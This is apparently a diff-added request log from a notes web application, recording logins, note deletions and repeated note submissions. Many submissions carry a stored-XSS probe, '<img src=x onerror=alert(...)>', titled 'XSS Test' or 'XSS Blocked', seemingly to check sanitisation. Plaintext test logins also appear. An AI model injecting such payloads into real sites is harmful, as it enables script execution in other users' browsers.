+[2025-06-15T13:58:00.813Z] OPTIONS /login | No Body in Request
+[2025-06-15T13:58:00.815Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T13:58:01.074Z] GET /notes | No Body in Request
+[2025-06-15T13:58:01.077Z] GET /notes | No Body in Request
+[2025-06-15T13:58:01.082Z] GET /notes | No Body in Request
+[2025-06-15T13:58:01.081Z] GET /notes | No Body in Request
+[2025-06-15T13:58:01.628Z] OPTIONS /notes | No Body in Request
+[2025-06-15T13:58:01.630Z] POST /notes | Body: {"title":"XSS Blocked","content":"<img src=x onerror=\"alert('SHOULD NOT RUN');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T13:58:36.348Z] GET /notes | No Body in Request
+[2025-06-15T13:58:36.689Z] GET /notes | No Body in Request
+[2025-06-15T13:58:36.696Z] GET /notes | No Body in Request
+[2025-06-15T13:58:36.704Z] GET /notes | No Body in Request
+[2025-06-15T13:58:36.699Z] GET /notes | No Body in Request
+[2025-06-15T13:58:40.436Z] OPTIONS /login | No Body in Request
+[2025-06-15T13:58:40.439Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T13:58:45.406Z] OPTIONS /notes | No Body in Request
+[2025-06-15T13:58:45.409Z] POST /notes | Body: {"title":"a","content":"<img src=x onerror=\"alert('XSS');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T13:59:19.239Z] OPTIONS /notes/684ed195b4fcb417901d6e2f | No Body in Request
+[2025-06-15T13:59:19.241Z] DELETE /notes/684ed195b4fcb417901d6e2f | No Body in Request
+[2025-06-15T13:59:29.566Z] OPTIONS /notes/684ed169b4fcb417901d6e21 | No Body in Request
+[2025-06-15T13:59:29.568Z] DELETE /notes/684ed169b4fcb417901d6e21 | No Body in Request
+[2025-06-15T13:59:41.480Z] OPTIONS /notes/684ed163b4fcb417901d6e13 | No Body in Request
+[2025-06-15T13:59:41.482Z] DELETE /notes/684ed163b4fcb417901d6e13 | No Body in Request
+[2025-06-15T13:59:45.825Z] OPTIONS /notes/684ed15db4fcb417901d6e05 | No Body in Request
+[2025-06-15T13:59:45.828Z] DELETE /notes/684ed15db4fcb417901d6e05 | No Body in Request
+[2025-06-15T13:59:51.767Z] OPTIONS /notes/684ed0c9b4fcb417901d6df7 | No Body in Request
+[2025-06-15T13:59:51.768Z] DELETE /notes/684ed0c9b4fcb417901d6df7 | No Body in Request
+[2025-06-15T13:59:55.469Z] OPTIONS /notes/684ed0c3b4fcb417901d6de9 | No Body in Request
+[2025-06-15T13:59:55.471Z] DELETE /notes/684ed0c3b4fcb417901d6de9 | No Body in Request
+[2025-06-15T13:59:58.819Z] OPTIONS /notes/684ed0bdb4fcb417901d6ddb | No Body in Request
+[2025-06-15T13:59:58.821Z] DELETE /notes/684ed0bdb4fcb417901d6ddb | No Body in Request
+[2025-06-15T14:00:01.882Z] OPTIONS /notes/684ed07cb4fcb417901d6dc9 | No Body in Request
+[2025-06-15T14:00:01.884Z] DELETE /notes/684ed07cb4fcb417901d6dc9 | No Body in Request
+[2025-06-15T14:00:05.604Z] OPTIONS /notes/684ed076b4fcb417901d6dbb | No Body in Request
+[2025-06-15T14:00:05.606Z] DELETE /notes/684ed076b4fcb417901d6dbb | No Body in Request
+[2025-06-15T14:00:09.599Z] OPTIONS /notes/684ed070b4fcb417901d6dad | No Body in Request
+[2025-06-15T14:00:09.601Z] DELETE /notes/684ed070b4fcb417901d6dad | No Body in Request
+[2025-06-15T14:00:23.131Z] OPTIONS /notes/684ed163b4fcb417901d6e13 | No Body in Request
+[2025-06-15T14:00:23.133Z] PUT /notes/684ed163b4fcb417901d6e13 | Body: {"title":"x","content":"x","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:00:26.593Z] PUT /notes/684ed163b4fcb417901d6e13 | Body: {"title":"x","content":"x","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:00:34.172Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:00:34.174Z] POST /notes | Body: {"title":"a","content":"a","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:00:41.042Z] GET /notes | No Body in Request
+[2025-06-15T14:00:41.373Z] GET /notes | No Body in Request
+[2025-06-15T14:00:41.376Z] GET /notes | No Body in Request
+[2025-06-15T14:00:41.377Z] GET /notes | No Body in Request
+[2025-06-15T14:00:41.379Z] GET /notes | No Body in Request
+[2025-06-15T14:00:57.978Z] GET /notes | No Body in Request
+[2025-06-15T14:00:58.302Z] GET /notes | No Body in Request
+[2025-06-15T14:00:58.307Z] GET /notes | No Body in Request
+[2025-06-15T14:00:58.305Z] GET /notes | No Body in Request
+[2025-06-15T14:00:58.308Z] GET /notes | No Body in Request
+[2025-06-15T14:01:10.644Z] GET /notes | No Body in Request
+[2025-06-15T14:01:10.800Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:01:10.804Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:01:11.046Z] GET /notes | No Body in Request
+[2025-06-15T14:01:11.048Z] GET /notes | No Body in Request
+[2025-06-15T14:01:11.050Z] GET /notes | No Body in Request
+[2025-06-15T14:01:11.052Z] GET /notes | No Body in Request
+[2025-06-15T14:01:11.533Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:01:11.536Z] POST /notes | Body: {"title":"XSS Test","content":"<img src=x onerror=\"alert('XSS');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:01:12.799Z] GET /notes | No Body in Request
+[2025-06-15T14:01:12.965Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:01:12.966Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:01:13.211Z] GET /notes | No Body in Request
+[2025-06-15T14:01:13.209Z] GET /notes | No Body in Request
+[2025-06-15T14:01:13.213Z] GET /notes | No Body in Request
+[2025-06-15T14:01:13.216Z] GET /notes | No Body in Request
+[2025-06-15T14:01:13.748Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:01:13.750Z] POST /notes | Body: {"title":"XSS Blocked","content":"<img src=x onerror=\"alert('SHOULD NOT RUN');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:01:23.874Z] GET /notes | No Body in Request
+[2025-06-15T14:01:24.204Z] GET /notes | No Body in Request
+[2025-06-15T14:01:24.210Z] GET /notes | No Body in Request
+[2025-06-15T14:01:24.213Z] GET /notes | No Body in Request
+[2025-06-15T14:01:24.216Z] GET /notes | No Body in Request
+[2025-06-15T14:01:56.279Z] GET /notes | No Body in Request
+[2025-06-15T14:01:56.452Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:01:56.454Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:01:56.693Z] GET /notes | No Body in Request
+[2025-06-15T14:01:56.695Z] GET /notes | No Body in Request
+[2025-06-15T14:01:56.697Z] GET /notes | No Body in Request
+[2025-06-15T14:01:56.699Z] GET /notes | No Body in Request
+[2025-06-15T14:01:57.734Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:01:57.736Z] POST /notes | Body: {"title":"XSS Test","content":"<img src=x onerror=\"alert('XSS');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:02:02.594Z] GET /notes | No Body in Request
+[2025-06-15T14:02:02.793Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:02:02.797Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:02:03.057Z] GET /notes | No Body in Request
+[2025-06-15T14:02:03.053Z] GET /notes | No Body in Request
+[2025-06-15T14:02:03.060Z] GET /notes | No Body in Request
+[2025-06-15T14:02:03.062Z] GET /notes | No Body in Request
+[2025-06-15T14:02:03.610Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:02:03.612Z] POST /notes | Body: {"title":"XSS Test","content":"<img src=x onerror=\"alert('XSS');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:02:08.764Z] GET /notes | No Body in Request
+[2025-06-15T14:02:08.934Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:02:08.937Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:02:09.177Z] GET /notes | No Body in Request
+[2025-06-15T14:02:09.179Z] GET /notes | No Body in Request
+[2025-06-15T14:02:09.180Z] GET /notes | No Body in Request
+[2025-06-15T14:02:09.184Z] GET /notes | No Body in Request
+[2025-06-15T14:02:09.701Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:02:09.702Z] POST /notes | Body: {"title":"XSS Blocked","content":"<img src=x onerror=\"alert('SHOULD NOT RUN');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:05:29.708Z] GET /notes | No Body in Request
+[2025-06-15T14:05:29.895Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:05:29.897Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:05:30.156Z] GET /notes | No Body in Request
+[2025-06-15T14:05:30.158Z] GET /notes | No Body in Request
+[2025-06-15T14:05:30.165Z] GET /notes | No Body in Request
+[2025-06-15T14:05:30.161Z] GET /notes | No Body in Request
+[2025-06-15T14:05:30.646Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:05:30.648Z] POST /notes | Body: {"title":"XSS Test","content":"<img src=x onerror=\"alert('XSS');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:05:35.691Z] GET /notes | No Body in Request
+[2025-06-15T14:05:35.915Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:05:35.918Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:05:36.170Z] GET /notes | No Body in Request
+[2025-06-15T14:05:36.168Z] GET /notes | No Body in Request
+[2025-06-15T14:05:36.176Z] GET /notes | No Body in Request
+[2025-06-15T14:05:36.175Z] GET /notes | No Body in Request
+[2025-06-15T14:05:36.786Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:05:36.789Z] POST /notes | Body: {"title":"XSS Test","content":"<img src=x onerror=\"alert('XSS');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:05:42.012Z] GET /notes | No Body in Request
+[2025-06-15T14:05:42.161Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:05:42.163Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:05:42.401Z] GET /notes | No Body in Request
+[2025-06-15T14:05:42.403Z] GET /notes | No Body in Request
+[2025-06-15T14:05:42.405Z] GET /notes | No Body in Request
+[2025-06-15T14:05:42.406Z] GET /notes | No Body in Request
+[2025-06-15T14:05:42.961Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:05:42.964Z] POST /notes | Body: {"title":"XSS Blocked","content":"<img src=x onerror=\"alert('SHOULD NOT RUN');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:06:09.150Z] GET /notes | No Body in Request
+[2025-06-15T14:06:09.470Z] GET /notes | No Body in Request
+[2025-06-15T14:06:09.476Z] GET /notes | No Body in Request
+[2025-06-15T14:06:09.474Z] GET /notes | No Body in Request
+[2025-06-15T14:06:09.478Z] GET /notes | No Body in Request
+[2025-06-15T14:12:07.445Z] GET /notes | No Body in Request
+[2025-06-15T14:12:07.589Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:12:07.591Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:12:07.823Z] GET /notes | No Body in Request
+[2025-06-15T14:12:07.826Z] GET /notes | No Body in Request
+[2025-06-15T14:12:07.829Z] GET /notes | No Body in Request
+[2025-06-15T14:12:07.832Z] GET /notes | No Body in Request
+[2025-06-15T14:12:11.942Z] GET /notes | No Body in Request
+[2025-06-15T14:12:12.143Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:12:12.146Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:12:12.394Z] GET /notes | No Body in Request
+[2025-06-15T14:12:12.397Z] GET /notes | No Body in Request
+[2025-06-15T14:12:12.401Z] GET /notes | No Body in Request
+[2025-06-15T14:12:12.402Z] GET /notes | No Body in Request
+[2025-06-15T14:12:16.547Z] GET /notes | No Body in Request
+[2025-06-15T14:12:16.725Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:12:16.727Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:12:16.956Z] GET /notes | No Body in Request
+[2025-06-15T14:12:16.958Z] GET /notes | No Body in Request
+[2025-06-15T14:12:16.960Z] GET /notes | No Body in Request
+[2025-06-15T14:12:16.963Z] GET /notes | No Body in Request
+[2025-06-15T14:12:21.142Z] GET /notes | No Body in Request
+[2025-06-15T14:12:21.379Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:12:21.382Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:12:21.629Z] GET /notes | No Body in Request
+[2025-06-15T14:12:21.626Z] GET /notes | No Body in Request
+[2025-06-15T14:12:21.633Z] GET /notes | No Body in Request
+[2025-06-15T14:12:21.635Z] GET /notes | No Body in Request
+[2025-06-15T14:12:45.770Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:12:45.772Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:12:51.040Z] OPTIONS /notes/684ed336b4fcb417901d6ece | No Body in Request
+[2025-06-15T14:12:51.043Z] DELETE /notes/684ed336b4fcb417901d6ece | No Body in Request
+[2025-06-15T14:12:53.541Z] OPTIONS /notes/684ed330b4fcb417901d6ec0 | No Body in Request
+[2025-06-15T14:12:53.543Z] DELETE /notes/684ed330b4fcb417901d6ec0 | No Body in Request
+[2025-06-15T14:12:55.437Z] OPTIONS /notes/684ed32ab4fcb417901d6eb2 | No Body in Request
+[2025-06-15T14:12:55.439Z] DELETE /notes/684ed32ab4fcb417901d6eb2 | No Body in Request
+[2025-06-15T14:12:57.550Z] OPTIONS /notes/684ed261b4fcb417901d6ea4 | No Body in Request
+[2025-06-15T14:12:57.553Z] DELETE /notes/684ed261b4fcb417901d6ea4 | No Body in Request
+[2025-06-15T14:13:00.046Z] OPTIONS /notes/684ed25bb4fcb417901d6e96 | No Body in Request
+[2025-06-15T14:13:00.048Z] DELETE /notes/684ed25bb4fcb417901d6e96 | No Body in Request
+[2025-06-15T14:13:01.542Z] OPTIONS /notes/684ed255b4fcb417901d6e88 | No Body in Request
+[2025-06-15T14:13:01.545Z] DELETE /notes/684ed255b4fcb417901d6e88 | No Body in Request
+[2025-06-15T14:13:03.149Z] OPTIONS /notes/684ed229b4fcb417901d6e70 | No Body in Request
+[2025-06-15T14:13:03.151Z] DELETE /notes/684ed229b4fcb417901d6e70 | No Body in Request
+[2025-06-15T14:13:04.680Z] OPTIONS /notes/684ed227b4fcb417901d6e62 | No Body in Request
+[2025-06-15T14:13:04.683Z] DELETE /notes/684ed227b4fcb417901d6e62 | No Body in Request
+[2025-06-15T14:13:06.448Z] OPTIONS /notes/684ed202b4fcb417901d6e40 | No Body in Request
+[2025-06-15T14:13:06.450Z] DELETE /notes/684ed202b4fcb417901d6e40 | No Body in Request
+[2025-06-15T14:13:11.535Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:13:11.536Z] POST /notes | Body: {"title":"a","content":"<img src=x onerror=\"\n  if (!window.__xss_ran) {\n    window.__xss_ran = true;\n    alert('SHOULD NOT RUN');\n  }\n\" />\n","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:13:19.896Z] GET /notes | No Body in Request
+[2025-06-15T14:13:20.219Z] GET /notes | No Body in Request
+[2025-06-15T14:13:20.222Z] GET /notes | No Body in Request
+[2025-06-15T14:13:20.225Z] GET /notes | No Body in Request
+[2025-06-15T14:13:20.227Z] GET /notes | No Body in Request
+[2025-06-15T14:13:29.926Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:13:29.928Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:13:36.515Z] OPTIONS /notes/684ed4f7b4fcb417901d6f11 | No Body in Request
+[2025-06-15T14:13:36.517Z] DELETE /notes/684ed4f7b4fcb417901d6f11 | No Body in Request
+[2025-06-15T14:13:57.797Z] GET /notes | No Body in Request
+[2025-06-15T14:13:57.973Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:13:57.976Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:13:58.249Z] GET /notes | No Body in Request
+[2025-06-15T14:13:58.251Z] GET /notes | No Body in Request
+[2025-06-15T14:13:58.257Z] GET /notes | No Body in Request
+[2025-06-15T14:13:58.254Z] GET /notes | No Body in Request
+[2025-06-15T14:14:02.474Z] GET /notes | No Body in Request
+[2025-06-15T14:14:02.681Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:14:02.684Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:14:02.940Z] GET /notes | No Body in Request
+[2025-06-15T14:14:02.943Z] GET /notes | No Body in Request
+[2025-06-15T14:14:02.946Z] GET /notes | No Body in Request
+[2025-06-15T14:14:02.950Z] GET /notes | No Body in Request
+[2025-06-15T14:14:07.419Z] GET /notes | No Body in Request
+[2025-06-15T14:14:07.611Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:14:07.614Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:14:07.879Z] GET /notes | No Body in Request
+[2025-06-15T14:14:07.881Z] GET /notes | No Body in Request
+[2025-06-15T14:14:07.883Z] GET /notes | No Body in Request
+[2025-06-15T14:14:07.885Z] GET /notes | No Body in Request
+[2025-06-15T14:14:12.252Z] GET /notes | No Body in Request
+[2025-06-15T14:14:12.483Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:14:12.486Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:14:12.757Z] GET /notes | No Body in Request
+[2025-06-15T14:14:12.759Z] GET /notes | No Body in Request
+[2025-06-15T14:14:12.764Z] GET /notes | No Body in Request
+[2025-06-15T14:14:12.767Z] GET /notes | No Body in Request
+[2025-06-15T14:16:55.241Z] GET / | No Body in Request
+[2025-06-15T14:17:00.046Z] GET / | No Body in Request
+[2025-06-15T14:17:01.690Z] GET /notes | No Body in Request
+[2025-06-15T14:17:02.018Z] GET /notes | No Body in Request
+[2025-06-15T14:17:02.021Z] GET /notes | No Body in Request
+[2025-06-15T14:17:02.025Z] GET /notes | No Body in Request
+[2025-06-15T14:17:02.028Z] GET /notes | No Body in Request
+[2025-06-15T14:17:05.006Z] GET / | No Body in Request
+[2025-06-15T14:17:09.927Z] GET / | No Body in Request
+[2025-06-15T14:19:42.041Z] GET /notes | No Body in Request
+[2025-06-15T14:19:42.221Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:19:42.223Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:19:42.460Z] GET /notes | No Body in Request
+[2025-06-15T14:19:42.462Z] GET /notes | No Body in Request
+[2025-06-15T14:19:42.464Z] GET /notes | No Body in Request
+[2025-06-15T14:19:42.466Z] GET /notes | No Body in Request
+[2025-06-15T14:19:43.055Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:19:43.057Z] POST /notes | Body: {"title":"XSS Test","content":"<img src=x onerror=\"alert('XSS');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:19:44.392Z] GET /notes | No Body in Request
+[2025-06-15T14:19:44.536Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:19:44.538Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:19:44.774Z] GET /notes | No Body in Request
+[2025-06-15T14:19:44.775Z] GET /notes | No Body in Request
+[2025-06-15T14:19:44.778Z] GET /notes | No Body in Request
+[2025-06-15T14:19:44.779Z] GET /notes | No Body in Request
+[2025-06-15T14:19:45.285Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:19:45.287Z] POST /notes | Body: {"title":"XSS Blocked","content":"<img src=x onerror=\"alert('SHOULD NOT RUN');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:20:11.702Z] GET /notes | No Body in Request
+[2025-06-15T14:20:11.886Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:20:11.888Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:20:12.157Z] GET /notes | No Body in Request
+[2025-06-15T14:20:12.160Z] GET /notes | No Body in Request
+[2025-06-15T14:20:12.162Z] GET /notes | No Body in Request
+[2025-06-15T14:20:12.165Z] GET /notes | No Body in Request
+[2025-06-15T14:20:12.736Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:20:12.738Z] POST /notes | Body: {"title":"XSS Test","content":"<img src=x onerror=\"alert('XSS');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:20:17.854Z] GET /notes | No Body in Request
+[2025-06-15T14:20:18.128Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:20:18.131Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:20:18.396Z] GET /notes | No Body in Request
+[2025-06-15T14:20:18.394Z] GET /notes | No Body in Request
+[2025-06-15T14:20:18.400Z] GET /notes | No Body in Request
+[2025-06-15T14:20:18.402Z] GET /notes | No Body in Request
+[2025-06-15T14:20:19.094Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:20:19.097Z] POST /notes | Body: {"title":"XSS Test","content":"<img src=x onerror=\"alert('XSS');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:20:24.155Z] GET /notes | No Body in Request
+[2025-06-15T14:20:24.353Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:20:24.355Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:20:24.599Z] GET /notes | No Body in Request
+[2025-06-15T14:20:24.600Z] GET /notes | No Body in Request
+[2025-06-15T14:20:24.605Z] GET /notes | No Body in Request
+[2025-06-15T14:20:24.604Z] GET /notes | No Body in Request
+[2025-06-15T14:20:25.151Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:20:25.153Z] POST /notes | Body: {"title":"XSS Blocked","content":"<img src=x onerror=\"alert('SHOULD NOT RUN');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:20:30.733Z] GET /notes | No Body in Request
+[2025-06-15T14:20:31.055Z] GET /notes | No Body in Request
+[2025-06-15T14:20:31.058Z] GET /notes | No Body in Request
+[2025-06-15T14:20:31.060Z] GET /notes | No Body in Request
+[2025-06-15T14:20:31.062Z] GET /notes | No Body in Request
+[2025-06-15T14:21:30.235Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:21:30.237Z] POST /login | Body: {"username":"amir","password":"amir"}
+[2025-06-15T14:21:45.291Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:21:45.293Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:21:48.700Z] OPTIONS /notes/684ed6a9b4fcb417901d6f99 | No Body in Request
+[2025-06-15T14:21:48.703Z] DELETE /notes/684ed6a9b4fcb417901d6f99 | No Body in Request
+[2025-06-15T14:21:50.277Z] OPTIONS /notes/684ed6a3b4fcb417901d6f8b | No Body in Request
+[2025-06-15T14:21:50.279Z] DELETE /notes/684ed6a3b4fcb417901d6f8b | No Body in Request
+[2025-06-15T14:21:51.748Z] OPTIONS /notes/684ed69cb4fcb417901d6f7d | No Body in Request
+[2025-06-15T14:21:51.750Z] DELETE /notes/684ed69cb4fcb417901d6f7d | No Body in Request
+[2025-06-15T14:21:53.177Z] OPTIONS /notes/684ed681b4fcb417901d6f6f | No Body in Request
+[2025-06-15T14:21:53.180Z] DELETE /notes/684ed681b4fcb417901d6f6f | No Body in Request
+[2025-06-15T14:21:54.698Z] OPTIONS /notes/684ed67fb4fcb417901d6f61 | No Body in Request
+[2025-06-15T14:21:54.700Z] DELETE /notes/684ed67fb4fcb417901d6f61 | No Body in Request
+[2025-06-15T14:22:09.328Z] GET /notes | No Body in Request
+[2025-06-15T14:22:09.540Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:22:09.542Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:22:09.789Z] GET /notes | No Body in Request
+[2025-06-15T14:22:09.791Z] GET /notes | No Body in Request
+[2025-06-15T14:22:09.793Z] GET /notes | No Body in Request
+[2025-06-15T14:22:09.795Z] GET /notes | No Body in Request
+[2025-06-15T14:22:10.435Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:22:10.437Z] POST /notes | Body: {"title":"XSS Test","content":"<img src=x onerror=\"alert('XSS');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:22:11.746Z] GET /notes | No Body in Request
+[2025-06-15T14:22:11.890Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:22:11.892Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:22:12.146Z] GET /notes | No Body in Request
+[2025-06-15T14:22:12.148Z] GET /notes | No Body in Request
+[2025-06-15T14:22:12.151Z] GET /notes | No Body in Request
+[2025-06-15T14:22:12.153Z] GET /notes | No Body in Request
+[2025-06-15T14:22:12.653Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:22:12.655Z] POST /notes | Body: {"title":"XSS Blocked","content":"<img src=x onerror=\"alert('SHOULD NOT RUN');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:22:16.722Z] GET /notes | No Body in Request
+[2025-06-15T14:22:17.038Z] GET /notes | No Body in Request
+[2025-06-15T14:22:17.041Z] GET /notes | No Body in Request
+[2025-06-15T14:22:17.047Z] GET /notes | No Body in Request
+[2025-06-15T14:22:17.044Z] GET /notes | No Body in Request
+[2025-06-15T14:23:17.242Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:23:17.244Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:25:55.378Z] OPTIONS /notes/684ed714b4fcb417901d6fc6 | No Body in Request
+[2025-06-15T14:25:55.380Z] DELETE /notes/684ed714b4fcb417901d6fc6 | No Body in Request
+[2025-06-15T14:25:56.876Z] OPTIONS /notes/684ed712b4fcb417901d6fb8 | No Body in Request
+[2025-06-15T14:25:56.879Z] DELETE /notes/684ed712b4fcb417901d6fb8 | No Body in Request
+[2025-06-15T14:26:09.116Z] GET /notes | No Body in Request
+[2025-06-15T14:26:09.279Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:26:09.281Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:26:09.519Z] GET /notes | No Body in Request
+[2025-06-15T14:26:09.518Z] GET /notes | No Body in Request
+[2025-06-15T14:26:09.521Z] GET /notes | No Body in Request
+[2025-06-15T14:26:09.522Z] GET /notes | No Body in Request
+[2025-06-15T14:26:10.096Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:26:10.099Z] POST /notes | Body: {"title":"XSS Test","content":"<img src=x onerror=\"alert('XSS');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:26:16.336Z] GET /notes | No Body in Request
+[2025-06-15T14:26:16.566Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:26:16.569Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:26:16.847Z] GET /notes | No Body in Request
+[2025-06-15T14:26:16.845Z] GET /notes | No Body in Request
+[2025-06-15T14:26:16.852Z] GET /notes | No Body in Request
+[2025-06-15T14:26:16.850Z] GET /notes | No Body in Request
+[2025-06-15T14:26:17.464Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:26:17.467Z] POST /notes | Body: {"title":"XSS Test","content":"<img src=x onerror=\"alert('XSS');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:26:23.668Z] GET /notes | No Body in Request
+[2025-06-15T14:26:23.810Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:26:23.812Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:26:24.081Z] GET /notes | No Body in Request
+[2025-06-15T14:26:24.078Z] GET /notes | No Body in Request
+[2025-06-15T14:26:24.084Z] GET /notes | No Body in Request
+[2025-06-15T14:26:24.086Z] GET /notes | No Body in Request
+[2025-06-15T14:26:24.578Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:26:24.580Z] POST /notes | Body: {"title":"XSS Blocked","content":"<img src=x onerror=\"alert('SHOULD NOT RUN');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:26:28.396Z] GET /notes | No Body in Request
+[2025-06-15T14:26:28.617Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:26:28.620Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:26:28.894Z] GET /notes | No Body in Request
+[2025-06-15T14:26:28.897Z] GET /notes | No Body in Request
+[2025-06-15T14:26:28.899Z] GET /notes | No Body in Request
+[2025-06-15T14:26:28.901Z] GET /notes | No Body in Request
+[2025-06-15T14:26:29.422Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:26:29.425Z] POST /notes | Body: {"title":"XSS Blocked","content":"<img src=x onerror=\"alert('SHOULD NOT RUN');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:30:55.370Z] GET /notes | No Body in Request
+[2025-06-15T14:30:55.699Z] GET /notes | No Body in Request
+[2025-06-15T14:30:55.703Z] GET /notes | No Body in Request
+[2025-06-15T14:30:55.708Z] GET /notes | No Body in Request
+[2025-06-15T14:30:55.705Z] GET /notes | No Body in Request
+[2025-06-15T14:31:00.532Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:31:00.535Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:31:04.415Z] OPTIONS /notes/684ed815b4fcb417901d700b | No Body in Request
